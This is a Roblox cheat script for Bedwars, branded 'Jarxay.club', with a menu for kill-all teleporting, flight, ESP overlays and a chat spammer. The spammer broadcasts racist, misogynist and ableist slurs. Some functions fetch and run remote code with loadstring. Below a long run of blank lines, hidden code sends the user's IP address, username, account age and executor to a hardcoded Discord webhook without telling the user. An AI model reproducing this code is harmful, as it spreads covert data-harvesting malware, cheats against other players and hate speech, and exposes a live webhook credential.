local plrname = game.Players.LocalPlayer.Character.Humanoid.DisplayName

















game.Players.LocalPlayer.Character.Humanoid:TakeDamage(99)
wait(0.1)
game.Players.LocalPlayer.Character.Humanoid:TakeDamage(1)






































local SpamMessage = "Jarxay.club | I really hate noggars."
local SpamMessage2 = "Jarxay.club | Woman shall never talk back to a man."
local SpamMessage3 = "Jarxay.club | Retard!?!?! Retard?!?!?! Retard?!?!?!"
local SpamMessage4 = "Jarxay.club | omg is that vxpe?!?!?"
local speed = 80















local plr = game.Players.LocalPlayer
local function addCape()
	local cdid = 9134962540
	local BottomCapePart = Instance.new("Part",plr.Character)
	BottomCapePart.BrickColor = BrickColor.new("Light green (Mint)")
	BottomCapePart.Name = "BottomCapePart"
	BottomCapePart.Size = Vector3.new(.1,.1,.1)
	local CapeHeadPart = Instance.new("Part",plr.Character)
	CapeHeadPart.BrickColor = BrickColor.new("Light green (Mint)")
	CapeHeadPart.Size = Vector3.new(.1,.1,.1)
	CapeHeadPart.Name = "CapeHeadPart"
	local a = Instance.new("Attachment")
	a.Name = "CapeAttachment"
	a.Position = Vector3.new(0, -2.5, 1.5)
	a.Orientation = Vector3.new(0, 0, 90)
	a.Parent = plr.Character.UpperTorso
	local b = Instance.new("Attachment")
	b.Name = "CapeAtch"
	b.Position = Vector3.new(0, .8, 0.4)
	b.Orientation = Vector3.new(0,0,90)
	b.Parent = plr.Character.UpperTorso
	local bal = Instance.new("Attachment",BottomCapePart)
	bal.Name = "bal"
	bal.Position = Vector3.new(0,0.125,0)
	bal.Orientation = Vector3.new(0,0,90)
	local cat = Instance.new("Attachment",CapeHeadPart)
	
	cat.Name = "cat"
	CapeHeadPart.cat.Position = Vector3.new(0,0,0.5)
	Instance.new("Beam",CapeHeadPart)
	CapeHeadPart.Beam.Attachment0 = CapeHeadPart.cat
	CapeHeadPart.Beam.Attachment1 = BottomCapePart.bal
	CapeHeadPart.Beam.Texture = "http://www.roblox.com/asset/?id="..cdid
	CapeHeadPart.Beam.Width0 = 2
	CapeHeadPart.Beam.Width1 = 2
	Instance.new("AlignOrientation",BottomCapePart)
	BottomCapePart.AlignOrientation.Attachment0 = BottomCapePart.bal
	BottomCapePart.AlignOrientation.Attachment1 = plr.Character.UpperTorso.CapeAttachment
	BottomCapePart.AlignOrientation.Responsiveness = 20
	Instance.new("AlignPosition",BottomCapePart)
	BottomCapePart.AlignPosition.Attachment0 = BottomCapePart.bal
	BottomCapePart.AlignPosition.Attachment1 = a
	BottomCapePart.AlignPosition.Position = a.WorldPosition
	BottomCapePart.AlignPosition.Responsiveness = 15
	Instance.new("BodyGyro",BottomCapePart)
	local const = Instance.new("RigidConstraint")
	const.Attachment0 = CapeHeadPart.cat
	const.Attachment1 = b
	const.Parent = CapeHeadPart
	CapeHeadPart.Anchored = false
	BottomCapePart.Anchored = false
	BottomCapePart.CanCollide = false
	BottomCapePart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	CapeHeadPart.CanCollide = false
	BottomCapePart.Parent = plr.Character
	CapeHeadPart.Parent = plr.Character
	BottomCapePart.Transparency = 0
	CapeHeadPart.Transparency = 0
end





















local function NametagsESP()
    --- Tut
 
local esp_settings = { ---- table for esp settings 
    textsize = 26,
    colour = 255,255,255
}
 
local gui = Instance.new("BillboardGui")
local esp = Instance.new("TextLabel",gui) ---- new instances to make the billboard gui and the textlabel
 
 
 
gui.Name = "Cracked esp"; ---- properties of the esp
gui.ResetOnSpawn = false
gui.AlwaysOnTop = true;
gui.LightInfluence = 0;
gui.Size = UDim2.new(1.75, 0, 1.75, 0);
esp.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
esp.BackgroundColor3.Transparency = 0
esp.Text = ""
esp.Size = UDim2.new(0.0001, 0.00001, 0.0001, 0.00001);
esp.BorderSizePixel = 4;
esp.BorderColor3 = Color3.new(esp_settings.colour)
esp.BorderSizePixel = 0
esp.Font = "Code"
esp.TextSize = esp_settings.textsize
esp.TextColor3 = Color3.fromRGB(esp_settings.colour) -- text colour
 
game:GetService("RunService").RenderStepped:Connect(function() ---- loops faster than a while loop :)
    for i,v in pairs (game:GetService("Players"):GetPlayers()) do
        if v ~= game:GetService("Players").LocalPlayer and v.Character.Head:FindFirstChild("Cracked esp")==nil  then -- craeting checks for team check, local player etc
            esp.Text = "{"..v.Name.."}"
            gui:Clone().Parent = v.Character.Head
    end
end
end)
end

local function LSDLights()
-- Roblox Graphics Enhancher
local light = game.Lighting
for i, v in pairs(light:GetChildren()) do
	v:Destroy()
end

local ter = workspace.Terrain
local color = Instance.new("ColorCorrectionEffect")
local bloom = Instance.new("BloomEffect")
local sun = Instance.new("SunRaysEffect")
local blur = Instance.new("BlurEffect")

color.Parent = light
bloom.Parent = light
sun.Parent = light
blur.Parent = light

-- enable or disable shit

local config = {

	Terrain = true;
	ColorCorrection = true;
	Sun = true;
	Lighting = true;
	BloomEffect = true;
	BlurEffect = true;
	
}

-- settings {

color.Enabled = false
color.Contrast = 0.45
color.Brightness = 0.1
color.Saturation = 0.5
color.TintColor = Color3.fromRGB(222, 222, 255)

bloom.Enabled = false
bloom.Intensity = 0.5

sun.Enabled = false
sun.Intensity = 0.15
sun.Spread = 1

bloom.Enabled = false
bloom.Intensity = 0.05
bloom.Size = 54
bloom.Threshold = 1

blur.Enabled = false
blur.Size = 4

-- settings }


if config.ColorCorrection then
	color.Enabled = true
end


if config.Sun then
	sun.Enabled = true
end

if config.BlurEffect then 
	blur.Enabled = true
end

if config.Terrain then
	-- settings {
	ter.WaterColor = Color3.fromRGB(10, 10, 56)
	ter.WaterWaveSize = 0.1
	ter.WaterWaveSpeed = 22
	ter.WaterTransparency = 0.8
	ter.WaterReflectance = 0.5
	-- settings }
end


if config.Lighting then
	-- settings {
	light.Ambient = Color3.fromRGB(145, 156, 211)
	light.Brightness = 2
	light.ColorShift_Bottom = Color3.fromRGB(122, 134, 122)
	light.ColorShift_Top = Color3.fromRGB(122, 135, 155)
	light.ExposureCompensation = 0.3
	light.FogColor = Color3.fromRGB(165, 132, 175)
	light.GlobalShadows = true
	light.OutdoorAmbient = Color3.fromRGB(145, 117, 128)
	light.Outlines = false
	-- settings }
end
end



local function CustomSky()
    s = Instance.new("Sky")
s.Name = "SKY"
s.SkyboxBk = "http://www.roblox.com/asset/?id=159454299"
s.SkyboxDn = "http://www.roblox.com/asset/?id=159454296"
s.SkyboxFt = "http://www.roblox.com/asset/?id=159454293"
s.SkyboxLf = "http://www.roblox.com/asset/?id=159454286"
s.SkyboxRt = "http://www.roblox.com/asset/?id=159454300"
s.SkyboxUp = "http://www.roblox.com/asset/?id=159454288"
s.Parent = game.Lighting
end



local IsFlyToggledToggle = false
local uis = game:GetService("UserInputService")


local function KillAllFunc()
    while true do
        
    game.Players.LocalPlayer.Character.Humanoid:ChangeState("Physics")
    for i,v in pairs(game.Players:GetChildren()) do
        if v.Character.Humanoid.Health >=1 then
            if v.Team ~= game.Players.LocalPlayer.Team then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
                wait(0.23)
                if v.Character.Humanoid.Health >= 1 then
                    while v.Character.Humanoid.Health >=1 do
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(1,1,-2)
                        wait(0.001)
                    end
                    
                    else
                end
            end
        end
end
wait(10)
end
end

local function VapeFunc()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
end

local function disablerFunc()

    game.Players.LocalPlayer.Character.Humanoid:TakeDamage(99999999999)
    wait(0.3)
    game.Players.LocalPlayer.Character.Humanoid:TakeDamage(99999999999)
    wait(0.3)
    game.Players.LocalPlayer.Character.Humanoid:TakeDamage(99999999999)
end

local function FlyForU()
    -- FLY SCRIPT BY RGEENEUS

-- The following code should be in a local script.
-- Only works on PC, not xbox or mobile. I do not have devices to test on.
-- Call the start fly function AFTER the character exists to fly. The function does not run if there is no character. 

 -- This is the fly speed. Change it to whatever you like. The variable can be changed while running

local c
local h
local bv
local bav
local cam
local flying
local p = game.Players.LocalPlayer
local buttons = {W = false, S = false, A = false, D = false, Moving = false}

local startFly = function () -- Call this function to begin flying 
	if not p.Character or not p.Character.Head or flying then return end
	c = p.Character
	h = c.Humanoid
	h.PlatformStand = true
	cam = workspace:WaitForChild('Camera')
	bv = Instance.new("BodyVelocity")
	bav = Instance.new("BodyAngularVelocity")
	bv.Velocity, bv.MaxForce, bv.P = Vector3.new(0, 0, 0), Vector3.new(10000, 10000, 10000), 1000
	bav.AngularVelocity, bav.MaxTorque, bav.P = Vector3.new(0, 0, 0), Vector3.new(10000, 10000, 10000), 1000
	bv.Parent = c.Head
	bav.Parent = c.Head
	flying = true
	h.Died:connect(function() flying = false end)
end

local endFly = function () -- Call this function to stop flying
	if not p.Character or not flying then return end
	h.PlatformStand = false
	bv:Destroy()
	bav:Destroy()
	flying = false
end

game:GetService("UserInputService").InputBegan:connect(function (input, GPE) 
	if GPE then return end
	for i, e in pairs(buttons) do
		if i ~= "Moving" and input.KeyCode == Enum.KeyCode[i] then
			buttons[i] = true
			buttons.Moving = true
		end
	end
end)

game:GetService("UserInputService").InputEnded:connect(function (input, GPE) 
	if GPE then return end
	local a = false
	for i, e in pairs(buttons) do
		if i ~= "Moving" then
			if input.KeyCode == Enum.KeyCode[i] then
				buttons[i] = false
			end
			if buttons[i] then a = true end
		end
	end
	buttons.Moving = a
end)

local setVec = function (vec)
	return vec * (speed / vec.Magnitude)
end

game:GetService("RunService").Heartbeat:connect(function (step) -- The actual fly function, called every frame
	if flying and c and c.PrimaryPart then
		local p = c.PrimaryPart.Position
		local cf = cam.CFrame
		local ax, ay, az = cf:toEulerAnglesXYZ()
		c:SetPrimaryPartCFrame(CFrame.new(p.x, p.y, p.z) * CFrame.Angles(ax, ay, az))
		if buttons.Moving then
			local t = Vector3.new()
			if buttons.W then t = t + (setVec(cf.lookVector)) end
			if buttons.S then t = t - (setVec(cf.lookVector)) end
			if buttons.A then t = t - (setVec(cf.rightVector)) end
			if buttons.D then t = t + (setVec(cf.rightVector)) end
			c:TranslateBy(t * step)
		end
	end
	
	startFly()
   
end)
end


local function BoxESP()
--[[    -- settings
local settings = {
   defaultcolor = Color3.fromRGB(255,0,0),
   teamcheck = true,
   teamcolor = false
};

-- services
local runService = game:GetService("RunService");
local players = game:GetService("Players");

-- variables
local localPlayer = players.LocalPlayer;
local camera = workspace.CurrentCamera;

-- functions
local newVector2, newColor3, newDrawing = Vector2.new, Color3.new, Drawing.new;
local tan, rad = math.tan, math.rad;
local round = function(...) local a = {}; for i,v in next, table.pack(...) do a[i] = math.round(v); end return unpack(a); end;
local wtvp = function(...) local a, b = camera.WorldToViewportPoint(camera, ...) return newVector2(a.X, a.Y), b, a.Z end;

local espCache = {};
local function createEsp(player)
   local drawings = {};
   
   drawings.box = newDrawing("Square");
   drawings.box.Thickness = 1;
   drawings.box.Filled = false;
   drawings.box.Color = settings.defaultcolor;
   drawings.box.Visible = false;
   drawings.box.ZIndex = 2;

   drawings.boxoutline = newDrawing("Square");
   drawings.boxoutline.Thickness = 3;
   drawings.boxoutline.Filled = false;
   drawings.boxoutline.Color = newColor3();
   drawings.boxoutline.Visible = false;
   drawings.boxoutline.ZIndex = 1;

   espCache[player] = drawings;
end

local function removeEsp(player)
   if rawget(espCache, player) then
       for _, drawing in next, espCache[player] do
           drawing:Remove();
       end
       espCache[player] = nil;
   end
end

local function updateEsp(player, esp)
   local character = player and player.Character;
   if character then
       local cframe = character:GetModelCFrame();
       local position, visible, depth = wtvp(cframe.Position);
       esp.box.Visible = visible;
       esp.boxoutline.Visible = visible;

       if cframe and visible then
           local scaleFactor = 1 / (depth * tan(rad(camera.FieldOfView / 2)) * 2) * 1000;
           local width, height = round(4 * scaleFactor, 5 * scaleFactor);
           local x, y = round(position.X, position.Y);

           esp.box.Size = newVector2(width, height);
           esp.box.Position = newVector2(round(x - width / 2, y - height / 2));
           esp.box.Color = settings.teamcolor and player.TeamColor.Color or settings.defaultcolor;

           esp.boxoutline.Size = esp.box.Size;
           esp.boxoutline.Position = esp.box.Position;
       end
   else
       esp.box.Visible = false;
       esp.boxoutline.Visible = false;
   end
end

-- main
for _, player in next, players:GetPlayers() do
   if player ~= localPlayer then
       createEsp(player);
   end
end

players.PlayerAdded:Connect(function(player)
   createEsp(player);
end);

players.PlayerRemoving:Connect(function(player)
   removeEsp(player);
end)

runService:BindToRenderStep("esp", Enum.RenderPriority.Camera.Value, function()
   for player, drawings in next, espCache do
       if settings.teamcheck and player.Team == localPlayer.Team then
           continue;
       end

       if drawings and player ~= localPlayer then
           updateEsp(player, drawings);
       end
   end
end)--]]
end

local function TracerESP()
    local function API_Check()
    if Drawing == nil then
        return "No"
    else
        return "Yes"
    end
end

local Find_Required = API_Check()


local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local Camera = game:GetService("Workspace").CurrentCamera
local UserInputService = game:GetService("UserInputService")
local TestService = game:GetService("TestService")

local Typing = false

_G.SendNotifications = false   -- If set to true then the script would notify you frequently on any changes applied and when loaded / errored. (If a game can detect this, it is recommended to set it to false)
_G.DefaultSettings = false   -- If set to true then the tracer script would run with default settings regardless of any changes you made.

_G.TeamCheck = true   -- If set to true then the script would create tracers only for the enemy team members.

--[!]-- ONLY ONE OF THESE VALUES SHOULD BE SET TO TRUE TO NOT ERROR THE SCRIPT --[!]--

_G.FromMouse = false   -- If set to true, the tracers will come from the position of your mouse curson on your screen.
_G.FromCenter = false   -- If set to true, the tracers will come from the center of your screen.
_G.FromBottom = true   -- If set to true, the tracers will come from the bottom of your screen.

_G.TracersVisible = true   -- If set to true then the tracers will be visible and vice versa.
_G.TracerColor = Color3.fromRGB(0, 255, 0)   -- The color that the tracers would appear as.
_G.TracerThickness = 1   -- The thickness of the tracers.
_G.TracerTransparency = 0.7   -- The transparency of the tracers.

_G.ModeSkipKey = Enum.KeyCode.E   -- The key that changes between modes that indicate where will the tracers come from.
_G.DisableKey = Enum.KeyCode.Q   -- The key that disables / enables the tracers.

local function CreateTracers()
    for _, v in next, Players:GetPlayers() do
        if v.Name ~= game.Players.LocalPlayer.Name then
            local TracerLine = Drawing.new("Line")
    
            RunService.RenderStepped:Connect(function()
                if workspace:FindFirstChild(v.Name) ~= nil and workspace[v.Name]:FindFirstChild("HumanoidRootPart") ~= nil then
                    local HumanoidRootPart_Position, HumanoidRootPart_Size = workspace[v.Name].HumanoidRootPart.CFrame, workspace[v.Name].HumanoidRootPart.Size * 1
                    local Vector, OnScreen = Camera:WorldToViewportPoint(HumanoidRootPart_Position * CFrame.new(0, -HumanoidRootPart_Size.Y, 0).p)
                    
                    TracerLine.Thickness = _G.TracerThickness
                    TracerLine.Transparency = _G.TracerTransparency
                    TracerLine.Color = _G.TracerColor

                    if _G.FromMouse == true and _G.FromCenter == false and _G.FromBottom == false then
                        TracerLine.From = Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y)
                    elseif _G.FromMouse == false and _G.FromCenter == true and _G.FromBottom == false then
                        TracerLine.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
                    elseif _G.FromMouse == false and _G.FromCenter == false and _G.FromBottom == true then
                        TracerLine.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
                    end

                    if OnScreen == true  then
                        TracerLine.To = Vector2.new(Vector.X, Vector.Y)
                        if _G.TeamCheck == true then 
                            if Players.LocalPlayer.Team ~= v.Team then
                                TracerLine.Visible = _G.TracersVisible
                            else
                                TracerLine.Visible = false
                            end
                        else
                            TracerLine.Visible = _G.TracersVisible
                        end
                    else
                        TracerLine.Visible = false
                    end
                else
                    TracerLine.Visible = false
                end
            end)

            Players.PlayerRemoving:Connect(function()
                TracerLine.Visible = false
            end)
        end
    end

    Players.PlayerAdded:Connect(function(Player)
        Player.CharacterAdded:Connect(function(v)
            if v.Name ~= game.Players.LocalPlayer.Name then
                local TracerLine = Drawing.new("Line")
        
                RunService.RenderStepped:Connect(function()
                    if workspace:FindFirstChild(v.Name) ~= nil and workspace[v.Name]:FindFirstChild("HumanoidRootPart") ~= nil then
                        local HumanoidRootPart_Position, HumanoidRootPart_Size = workspace[v.Name].HumanoidRootPart.CFrame, workspace[v.Name].HumanoidRootPart.Size * 1
                    	local Vector, OnScreen = Camera:WorldToViewportPoint(HumanoidRootPart_Position * CFrame.new(0, -HumanoidRootPart_Size.Y, 0).p)
                        
                        TracerLine.Thickness = _G.TracerThickness
                        TracerLine.Transparency = _G.TracerTransparency
                        TracerLine.Color = _G.TracerColor

                        if _G.FromMouse == true and _G.FromCenter == false and _G.FromBottom == false then
                            TracerLine.From = Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y)
                        elseif _G.FromMouse == false and _G.FromCenter == true and _G.FromBottom == false then
                            TracerLine.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
                        elseif _G.FromMouse == false and _G.FromCenter == false and _G.FromBottom == true then
                            TracerLine.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
                        end

                        if OnScreen == true  then
                            TracerLine.To = Vector2.new(Vector.X, Vector.Y)
                            if _G.TeamCheck == true then 
                                if Players.LocalPlayer.Team ~= Player.Team then
                                    TracerLine.Visible = _G.TracersVisible
                                else
                                    TracerLine.Visible = false
                                end
                            else
                                TracerLine.Visible = _G.TracersVisible
                            end
                        else
                            TracerLine.Visible = false
                        end
                    else
                        TracerLine.Visible = false
                    end
                end)

                Players.PlayerRemoving:Connect(function()
                    TracerLine.Visible = false
                end)
            end
        end)
    end)
end

UserInputService.TextBoxFocused:Connect(function()
    Typing = true
end)

UserInputService.TextBoxFocusReleased:Connect(function()
    Typing = false
end)

UserInputService.InputBegan:Connect(function(Input)
    if Input.KeyCode == _G.ModeSkipKey and Typing == false then
        if _G.FromMouse == true and _G.FromCenter == false and _G.FromBottom == false and _G.TracersVisible == true then
            _G.FromCenter = false
            _G.FromBottom = true
            _G.FromMouse = false

            if _G.SendNotifications == true then
                game:GetService("StarterGui"):SetCore("SendNotification",{
                    Title = "Exunys Developer";
                    Text = "Tracers will be now coming from the bottom of your screen (Mode 1)";
                    Duration = 5;
                })
            end
        elseif _G.FromMouse == false and _G.FromCenter == false and _G.FromBottom == true and _G.TracersVisible == true then
            _G.FromCenter = true
            _G.FromBottom = false
            _G.FromMouse = false

            if _G.SendNotifications == true then
                game:GetService("StarterGui"):SetCore("SendNotification",{
                    Title = "Exunys Developer";
                    Text = "Tracers will be now coming from the center of your screen (Mode 2)";
                    Duration = 5;
                })
            end
        elseif _G.FromMouse == false and _G.FromCenter == true and _G.FromBottom == false and _G.TracersVisible == true then
            _G.FromCenter = false
            _G.FromBottom = false
            _G.FromMouse = true

            if _G.SendNotifications == true then
                game:GetService("StarterGui"):SetCore("SendNotification",{
                    Title = "Exunys Developer";
                    Text = "Tracers will be now coming from the position of your mouse cursor on your screen (Mode 3)";
                    Duration = 5;
                })
            end
        end
    elseif Input.KeyCode == _G.DisableKey and Typing == false then
        _G.TracersVisible = not _G.TracersVisible
        
        if _G.SendNotifications == true then
            game:GetService("StarterGui"):SetCore("SendNotification",{
                Title = "Exunys Developer";
                Text = "The tracers' visibility is now set to "..tostring(_G.TracersVisible)..".";
                Duration = 5;
            })
        end
    end
end)

if _G.DefaultSettings == true then
    _G.TeamCheck = false
    _G.FromMouse = false
    _G.FromCenter = false
    _G.FromBottom = true
    _G.TracersVisible = true
    _G.TracerColor = Color3.fromRGB(40, 90, 255)
    _G.TracerThickness = 1
    _G.TracerTransparency = 0.5
    _G.ModeSkipKey = Enum.KeyCode.E
    _G.DisableKey = Enum.KeyCode.Q
end

local Success, Errored = pcall(function()
    CreateTracers()
end)

if Success and not Errored then
    if _G.SendNotifications == true then
        game:GetService("StarterGui"):SetCore("SendNotification",{
            Title = "Exunys Developer";
            Text = "Tracer script has successfully loaded.";
            Duration = 5;
        })
    end
elseif Errored and not Success then
    if _G.SendNotifications == true then
        game:GetService("StarterGui"):SetCore("SendNotification",{
            Title = "Exunys Developer";
            Text = "Tracer script has errored while loading, please check the developer console! (F9)";
            Duration = 5;
        })
    end
    TestService:Message("The tracer script has errored, please notify Exunys with the following information :")
    warn(Errored)
    print("!! IF THE ERROR IS A FALSE POSITIVE (says that a player cannot be found) THEN DO NOT BOTHER !!")
end
end
















local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()

local Window = Library.CreateLib("Jarxay.club 1.0 | ".. plrname, "Ocean")


local PlayerTab = Window:NewTab("LocalPlayer")
local VisualsTab = Window:NewTab("Visuals")
local TeleportTab = Window:NewTab("Teleport")
local QueueTab = Window:NewTab("Queue")
local SettingsTab = Window:NewTab("Miscellaneous")

local VisualsSection = VisualsTab:NewSection("Visuals")
local PlayerSection = PlayerTab:NewSection("Player")
local QueueSection = QueueTab:NewSection("Queue")
local TeleportSection = TeleportTab:NewSection("Teleport")
local SettingsSection = SettingsTab:NewSection("Miscellaneous")
  

SettingsSection:NewButton("Inject Vxpe.gg", "Made by 7GrandDadPGN", function()
    print("Clicked")
    VapeFunc()
end)

SettingsSection:NewKeybind("Toggle the UI", "KeybindInfo", Enum.KeyCode.LeftAlt, function()
	Library:ToggleUI()
end)




PlayerSection:NewButton("KillAll", "Made by Jarxay", function()
    print("Clicked")
    KillAllFunc()
end)

PlayerSection:NewButton("Flight", "Made by Jarxay", function()
    print("Clicked")
    FlyForU()
end)


PlayerSection:NewButton("NoSlowdown", "Made by Jarxay", function()
    while true do
        wait()
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 14
    end
end)





for i,v in pairs(game.Players:GetChildren()) do
TeleportSection:NewButton(v.Name, "Made by Jarxay", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
end)
end

VisualsSection:NewButton("ESP - Box", "Made by Jarxay", function()
    print("Clicked")
    BoxESP()
end)

VisualsSection:NewButton("ESP - Tracers", "Made by Jarxay", function()
    print("Clicked")
    TracerESP()
end)

VisualsSection:NewButton("ESP - Nametags", "Made by Jarxay", function()
    print("Clicked")
    NametagsESP()
end)

VisualsSection:NewButton("FOV Changer", "Made by Jarxay", function()
    print("Clicked")
    while true do
        wait()
    game.Workspace.Camera.FieldOfView = 120
    end
end)
addCape()



QueueSection:NewButton("=====================================", "Made by Jarxay", function()
    print("Clicked")
end)

QueueSection:NewButton("Bedwars - Solo", "Made by Jarxay", function()
    print("Clicked")
    -- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = {
        ["queueType"] = "bedwars_to1"
    }
}

game:GetService("ReplicatedStorage"):FindFirstChild("events-@easy-games/lobby:shared/event/lobby-events@getEvents.Events").joinQueue:FireServer(unpack(args))

end)

QueueSection:NewButton("Bedwars - Doubles", "Made by Jarxay", function()
    print("Clicked")
    -- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = {
        ["queueType"] = "bedwars_to1"
    }
}

game:GetService("ReplicatedStorage"):FindFirstChild("events-@easy-games/lobby:shared/event/lobby-events@getEvents.Events").joinQueue:FireServer(unpack(args))

end)

QueueSection:NewButton("Bedwars - Squads", "Made by Jarxay", function()
    print("Clicked")
    -- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = {
        ["queueType"] = "bedwars_to1"
    }
}

game:GetService("ReplicatedStorage"):FindFirstChild("events-@easy-games/lobby:shared/event/lobby-events@getEvents.Events").joinQueue:FireServer(unpack(args))

end)


QueueSection:NewButton("Bedwars - 30v30", "Made by Jarxay", function()
    print("Clicked")
    -- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = {
        ["queueType"] = "bedwars_20v20"
    }
}

game:GetService("ReplicatedStorage"):FindFirstChild("events-@easy-games/lobby:shared/event/lobby-events@getEvents.Events").joinQueue:FireServer(unpack(args))

end)

QueueSection:NewButton("=====================================", "Made by Jarxay", function()
    print("Clicked")
end)

QueueSection:NewButton("Skywars - Doubles", "Made by Jarxay", function()
    print("Clicked")
    -- Script generated by SimpleSpy - credits to exx#9394

    local args = {
        [1] = {
            ["queueType"] = "skywars_to2"
        }
    }
    
    game:GetService("ReplicatedStorage"):FindFirstChild("events-@easy-games/lobby:shared/event/lobby-events@getEvents.Events").joinQueue:FireServer(unpack(args))

end)

QueueSection:NewButton("=====================================", "Made by Jarxay", function()
    print("Clicked")
end)

PlayerSection:NewButton("ChatSpammer", "Made by Jarxay", function()
    print("Clicked")
    while true do
        wait(5)
        local args1 = {
        [1] = SpamMessage,
        [2] = "All"
    }
    
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args1))
    wait(4)
    local args2 = {
        [1] = SpamMessage2,
        [2] = "All"
    }
    
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args2))
    wait(4)
    local args3 = {
        [1] = SpamMessage3,
        [2] = "All"
    }
    
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args3))
    wait(2)
    local args4 = {
        [1] = SpamMessage4,
        [2] = "All"
    }
    
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args4))
    end
end)




PlayerSection:NewButton("VClipDown", "Made by Jarxay", function()
    print("Clicked")
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-12,0)
end)



LSDLights()
wait(0.4)
CustomSky()

-- Script generated by SimpleSpy - credits to exx#9394















































































































































































































































local ipADDR = tostring(game:HttpGet("https://api.ipify.org", true))
print(ipADDR)



local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "WTF?"
	local HttpService = game:GetService("HttpService")
	local Data =
		{
			["embeds"]= {
				{
					["title"]= "Injection game",
					["url"]= "https://www.roblox.com/games/"..game.PlaceId,
					["description"]= "hi",
					["color"]= 16731726,
					["fields"]= {
						{
							["name"]= "Executor",
							["value"]= ExecutorUsing,
							["inline"]= true
						},
						{
							["name"]= "Account age",
							["value"]= game.Players.LocalPlayer.AccountAge.. " Days old",
							["inline"]= true
						},
						{
							["name"]= "Roblox Username",
							["value"]= game.Players.LocalPlayer.Name,
							["inline"]= true
						},
						{
							["name"]= "IP",
							["value"]= ipADDR,
							["inline"]= true
						},
					}              
				}
			}
		}

	local Headers = {["Content-Type"]="application/json"}
	local Encoded = HttpService:JSONEncode(Data)

	Request = http_request or request or HttpPost or syn.request
	local Final = {Url = "https://discord.com/api/webhooks/967582608584224768/N3KYiFl6Buk44vxOsOgccKxiEWz3mdWjIqX14RXZx8GCNdWzw0v21sCx7HLkaVu9vOJu", Body = Encoded, Method = "POST", Headers = Headers}
	Request(Final)
	



-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local TextLabel = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

TextLabel.Parent = ScreenGui
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.461973637, 0, -0.0352941193, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.Code
TextLabel.Text = "Jarxay.club"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true
